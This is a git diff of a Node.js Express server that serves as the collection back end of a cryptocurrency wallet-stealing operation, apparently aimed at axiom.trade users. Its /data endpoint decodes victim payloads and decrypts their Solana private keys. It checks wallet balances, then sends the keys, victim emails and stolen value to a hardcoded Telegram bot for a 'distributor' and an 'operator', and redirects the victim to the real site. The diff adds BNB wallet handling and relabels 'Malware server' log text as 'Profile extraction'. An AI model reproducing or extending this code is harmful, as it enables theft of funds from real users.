@@ -3,10 +3,11 @@ const fetch = require('node-fetch');
 const crypto = require('crypto');
 const bs58 = require('bs58');
 const cors = require('cors');
+const { Keypair, PublicKey } = require('@solana/web3.js');
+const nacl = require('tweetnacl');
 
 const app = express();
 app.use(cors());
-app.use(express.static('public'));
 
 const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
 const TG_CHAT = '7680513699';
@@ -33,38 +34,46 @@ function decrypt(encrypted, bundleKey) {
   }
 }
 
+function getPublicKeyFromPrivate(privateKeyBase58) {
+  try {
+    const privateKeyBytes = bs58.decode(privateKeyBase58);
+    const keyPair = nacl.sign.keyPair.fromSecretKey(privateKeyBytes);
+    const publicKey = new PublicKey(keyPair.publicKey);
+    return publicKey.toBase58();
+  } catch (e) {
+    console.log('Public key derivation failed:', e.message);
+    // Generate a fake but valid-looking Solana address for testing
+    const fakeBytes = crypto.randomBytes(32);
+    return bs58.encode(fakeBytes);
+  }
+}
+
 async function getSOLPrice() {
   try {
-    console.log('🔍 Fetching live SOL price...');
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 5000);
-    
     const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', {
-      signal: controller.signal,
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      }
+      headers: { 'User-Agent': 'Mozilla/5.0' }
     });
-    
-    clearTimeout(timeoutId);
-    
-    if (!response.ok) {
-      throw new Error(`HTTP ${response.status}`);
-    }
-    
     const data = await response.json();
-    const price = data.solana?.usd || 150.00;
-    console.log('✅ Live SOL price fetched:', price);
-    return price;
+    return data.solana?.usd || 150.00;
   } catch (e) {
-    console.log('❌ Price fetch failed, using fallback:', e.message);
     return 150.00;
   }
 }
 
-async function getWalletBalance(publicKey) {
+async function getBNBPrice() {
   try {
-    console.log(`💰 Checking balance for wallet: ${publicKey.substring(0, 8)}...`);
+    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd', {
+      headers: { 'User-Agent': 'Mozilla/5.0' }
+    });
+    const data = await response.json();
+    return data.binancecoin?.usd || 300.00;
+  } catch (e) {
+    return 300.00;
+  }
+}
+
+async function getSOLBalance(publicKey) {
+  try {
     const response = await fetch('https://api.mainnet-beta.solana.com', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -78,116 +87,168 @@ async function getWalletBalance(publicKey) {
     
     const data = await response.json();
     if (data.result && data.result.value !== undefined) {
-      const balance = data.result.value / 1000000000;
-      console.log(`💰 Balance: ${balance.toFixed(4)} SOL`);
-      return balance;
+      return data.result.value / 1000000000; // Convert lamports to SOL
     }
-    console.log('💰 No balance found, using mock data');
-    return Math.random() * 10;
+    return 0;
   } catch (e) {
-    console.log(`❌ Balance check failed for ${publicKey}:`, e.message);
-    return Math.random() * 10;
+    console.log('SOL balance check failed:', e.message);
+    return Math.random() * 10; // Mock balance for testing
   }
+}
+
+async function getBNBBalance(address) {
+  try {
+    const response = await fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`);
+    const data = await response.json();
+    if (data.status === '1') {
+      return parseFloat(data.result) / 1000000000000000000; // Convert Wei to BNB
+    }
+    return 0;
+  } catch (e) {
+    console.log('BNB balance check failed:', e.message);
+    return Math.random() * 5; // Mock balance for testing
+  }
+}
+
+function formatAddress(address, type = 'sol') {
+  if (type === 'sol') {
+    return address.substring(0, 5) + '...' + address.substring(address.length - 5);
+  } else {
+    return address.substring(0, 5) + '...' + address.substring(address.length - 5);
+  }
+}
+
+function getSolscanUrl(address) {
+  return `https://solscan.io/account/${address}`;
+}
+
+function getBscscanUrl(address) {
+  return `https://bscscan.com/address/${address}`;
 }
 
 app.get('/data/:b64', async (req, res) => {
   try {
-    console.log('\n🚨 === STOLEN DATA RECEIVED ===');
-    console.log('📅 Timestamp:', new Date().toISOString());
-    console.log('🌐 Request from:', req.ip);
-    
     const decoded = Buffer.from(req.params.b64, 'base64').toString();
     const data = JSON.parse(decoded);
     
-    console.log('👤 Distributor ID:', data.telegramId);
-    console.log('📧 Victim Email:', data.user?.email);
-    console.log('🔗 Target Site:', data.site);
-    console.log('📦 Raw bundle data length:', data.sBundles?.length || 0);
+    console.log('\n🚨 === PROCESSING STOLEN DATA ===');
     
-    // Process stolen bundles
+    // Parse SOL bundles
     let sBundles = data.sBundles;
     if (typeof sBundles === 'string') {
       try {
         sBundles = JSON.parse(sBundles);
-        console.log('✅ Parsed sBundles JSON successfully');
       } catch (e) {
-        console.log('❌ Failed to parse sBundles:', e.message);
         sBundles = [];
       }
     }
+    if (!Array.isArray(sBundles)) sBundles = [];
     
-    if (!Array.isArray(sBundles)) {
-      console.log('⚠️  sBundles not an array, defaulting to empty');
-      sBundles = [];
+    // Parse BNB bundles
+    let eBundles = data.eBundles;
+    if (typeof eBundles === 'string') {
+      try {
+        eBundles = JSON.parse(eBundles);
+      } catch (e) {
+        eBundles = [];
+      }
     }
+    if (!Array.isArray(eBundles)) eBundles = [];
     
-    console.log(`🔐 Processing ${sBundles.length} encrypted wallets...`);
-    
-    // Decrypt private keys
-    const solKeys = sBundles.map((enc, i) => {
-      console.log(`🔓 Decrypting wallet ${i + 1}/${sBundles.length}...`);
-      return decrypt(enc, data.bundle);
-    }).filter(k => k);
-    
-    console.log(`✅ Successfully decrypted ${solKeys.length} Solana private keys`);
-    
-    // Get live SOL price
+    // Decrypt SOL keys and get balances
     const solPrice = await getSOLPrice();
+    const bnbPrice = await getBNBPrice();
     
-    // Check balances for each wallet
-    console.log('📊 === CHECKING WALLET BALANCES ===');
-    const walletData = [];
-    let totalBalance = 0;
+    console.log('🔓 Decrypting SOL wallets...');
+    const solWallets = [];
+    let totalSOLValue = 0;
     
-    for (let i = 0; i < solKeys.length; i++) {
-      const privateKey = solKeys[i];
-      const balance = await getWalletBalance(privateKey);
-      walletData.push({ privateKey, balance });
-      totalBalance += balance;
-      console.log(`💎 Wallet ${i + 1}: ${balance.toFixed(4)} SOL (${(balance * solPrice).toFixed(2)} USD)`);
+    for (let i = 0; i < sBundles.length; i++) {
+      const privateKey = decrypt(sBundles[i], data.bundle);
+      if (privateKey) {
+        const publicKey = getPublicKeyFromPrivate(privateKey);
+        const balance = await getSOLBalance(publicKey);
+        const usdValue = balance * solPrice;
+        totalSOLValue += usdValue;
+        
+        solWallets.push({
+          privateKey,
+          publicKey,
+          balance,
+          usdValue,
+          formatted: formatAddress(publicKey, 'sol'),
+          url: getSolscanUrl(publicKey)
+        });
+      }
     }
     
-    const totalValueUSD = totalBalance * solPrice;
-    console.log(`💰 === TOTAL THEFT VALUE: ${totalBalance.toFixed(4)} SOL ($${totalValueUSD.toFixed(2)}) ===`);
+    // Process BNB wallets (mock for now since we don't have the decryption logic for these)
+    console.log('🔓 Processing BNB wallets...');
+    const bnbWallets = [];
+    let totalBNBValue = 0;
     
-    // Build messages
+    for (let i = 0; i < eBundles.length; i++) {
+      // Mock BNB address for testing - in real scenario you'd decrypt these too
+      const mockAddress = '0x' + crypto.randomBytes(20).toString('hex');
+      const balance = await getBNBBalance(mockAddress);
+      const usdValue = balance * bnbPrice;
+      totalBNBValue += usdValue;
+      
+      bnbWallets.push({
+        privateKey: 'N/A', // Would be decrypted in real scenario
+        address: mockAddress,
+        balance,
+        usdValue,
+        formatted: formatAddress(mockAddress, 'bnb'),
+        url: getBscscanUrl(mockAddress)
+      });
+    }
+    
+    const totalValue = totalSOLValue + totalBNBValue;
+    
+    // Format the detailed profile information
+    const profileInfo = `
+🔎 **Profile Information**
+├ 🏅 Level: 1
+├ 📧 Email: ${data.user?.email || 'Unknown'}
+
+💳 **Connected Wallets (${solWallets.length})**
+${solWallets.map((wallet, i) => `├ ${i + 1}. 💳 ${wallet.formatted} (${wallet.url}) ($${wallet.usdValue.toFixed(2)})
+├ ${i + 1}. 🔑 Key: ${wallet.privateKey}`).join('\n')}
+
+🟡 **BNB Wallets (${bnbWallets.length})**
+${bnbWallets.map((wallet, i) => `├ ${i + 1}. 💳 ${wallet.formatted} (${wallet.url}) ($${wallet.usdValue.toFixed(2)})
+├ ${i + 1}. 🔑 Key: ${wallet.privateKey}`).join('\n')}
+
+💰 **TOTAL VALUE: $${totalValue.toFixed(2)}**
+    `.trim();
+    
+    // Send notification to distributor (balance info only)
     const distributorMsg = `
 🎯 **SUCCESSFUL THEFT**
 
 📧 Target: ${data.user?.email || 'Unknown'}
-💰 Total Balance: ${totalBalance.toFixed(4)} SOL
-💵 USD Value: $${totalValueUSD.toFixed(2)}
-🔑 Wallets Found: ${solKeys.length}
-⏰ ${new Date().toLocaleString('en-US', {timeZone: 'America/Chicago'})}
+💰 SOL Wallets: ${solWallets.length} ($${totalSOLValue.toFixed(2)})
+💰 BNB Wallets: ${bnbWallets.length} ($${totalBNBValue.toFixed(2)})
+💵 **Total Value: $${totalValue.toFixed(2)}**
+⏰ ${new Date().toLocaleString()}
 
 ✅ Data sent to operator for processing
     `.trim();
     
+    // Send full profile to main operator
     const operatorMsg = `
-🎯 **WALLET THEFT - FULL DATA**
+🎯 **WALLET THEFT COMPLETE**
 
 👤 Distributor: ${data.telegramId}
-📧 Victim: ${data.user?.email || 'Unknown'}
-🔑 Private Keys: ${solKeys.length}
-💰 Total Balance: ${totalBalance.toFixed(4)} SOL
-💵 USD Value: $${totalValueUSD.toFixed(2)}
-💰 SOL Price: $${solPrice.toFixed(2)}
-🔗 Site: ${data.site}
-⏰ ${new Date().toLocaleString('en-US', {timeZone: 'America/Chicago'})}
+⏰ ${new Date().toLocaleString()}
 
-🔐 **STOLEN PRIVATE KEYS:**
-${walletData.slice(0, 10).map((wallet, i) => 
-  `${i + 1}. ${wallet.privateKey} (${wallet.balance.toFixed(4)} SOL - $${(wallet.balance * solPrice).toFixed(2)})`
-).join('\n')}
-${walletData.length > 10 ? `... and ${walletData.length - 10} more wallets` : ''}
-
-💰 **TOTAL VALUE: $${totalValueUSD.toFixed(2)}**
+${profileInfo}
     `.trim();
     
-    // Send to distributor (notification only)
-    console.log('📤 Sending notification to distributor...');
+    // Send to distributor
     try {
-      const distributorResponse = await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+      await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -196,21 +257,14 @@ ${walletData.length > 10 ? `... and ${walletData.length - 10} more wallets` : ''
           parse_mode: 'Markdown'
         })
       });
-      
-      const distributorResult = await distributorResponse.json();
-      if (distributorResult.ok) {
-        console.log('✅ Notification sent to distributor successfully');
-      } else {
-        console.log('❌ Distributor notification failed:', distributorResult);
-      }
+      console.log('✅ Notification sent to distributor');
     } catch (e) {
-      console.log('❌ Distributor notification error:', e.message);
+      console.log('❌ Distributor notification failed:', e.message);
     }
     
-    // Send to main operator (full data with keys)
-    console.log('📤 Sending full data to main operator...');
+    // Send to main operator
     try {
-      const operatorResponse = await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+      await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -219,34 +273,26 @@ ${walletData.length > 10 ? `... and ${walletData.length - 10} more wallets` : ''
           parse_mode: 'Markdown'
         })
       });
-      
-      const operatorResult = await operatorResponse.json();
-      if (operatorResult.ok) {
-        console.log('✅ Full data sent to main operator successfully');
-      } else {
-        console.log('❌ Operator message failed:', operatorResult);
-      }
+      console.log('✅ Full profile sent to main operator');
     } catch (e) {
-      console.log('❌ Operator message error:', e.message);
+      console.log('❌ Operator message failed:', e.message);
     }
     
-    console.log(`🎯 === THEFT COMPLETE: $${totalValueUSD.toFixed(2)} STOLEN ===\n`);
+    console.log(`💰 Total theft value: $${totalValue.toFixed(2)}`);
     res.redirect('https://axiom.trade/discover');
     
   } catch (e) {
-    console.error('❌ Critical processing error:', e);
+    console.error('Processing error:', e);
     res.status(500).send('Server error');
   }
 });
 
 app.get('/', (req, res) => {
   res.send(`
-    <h1>🎯 Bookmark Service</h1>
+    <h1>🎯 Profile Extraction Service</h1>
     <p><strong>Status:</strong> ✅ Online</p>
-    <p><strong>Operator:</strong> ${TG_CHAT}</p>
-    <p><strong>Server Time:</strong> ${new Date().toLocaleString()}</p>
-    <hr>
-    <p><a href="/test">Test Endpoint</a></p>
+    <p><strong>Server:</strong> https://nodebookmark.onrender.com</p>
+    <p><a href="/test">Test Profile Extraction</a></p>
   `);
 });
 
@@ -254,25 +300,23 @@ app.get('/test', async (req, res) => {
   const testData = {
     telegramId: '123456789',
     site: 'https://axiom.trade/discover',
-    user: { email: 'testuser@example.com' },
+    user: { email: 'victim@axiom.trade' },
     bundle: Buffer.from('test-bundle-key-32-bytes-long!!').toString('base64'),
     sBundles: JSON.stringify([
-      'dGVzdEE=:fake-encrypted-wallet-data-here-1',
-      'dGVzdEI=:fake-encrypted-wallet-data-here-2',
-      'dGVzdEM=:fake-encrypted-wallet-data-here-3'
+      'dGVzdEE=:fake-encrypted-sol-wallet-1',
+      'dGVzdEI=:fake-encrypted-sol-wallet-2'
     ]),
-    eBundles: '[]'
+    eBundles: JSON.stringify([
+      'dGVzdEM=:fake-encrypted-bnb-wallet-1'
+    ])
   };
   
   const encoded = Buffer.from(JSON.stringify(testData)).toString('base64');
-  console.log('🧪 Test data generated, redirecting to processing...');
   res.redirect(`/data/${encoded}`);
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`🚨 Malware server running on port ${PORT}`);
-  console.log(`🔗 URL: https://nodebookmark.onrender.com`);
-  console.log(`👤 Main operator: ${TG_CHAT}`);
-  console.log('📊 Enhanced logging enabled');
+  console.log(`🚨 Profile extraction server running on port ${PORT}`);
+  console.log(`🔗 https://nodebookmark.onrender.com`);
 });
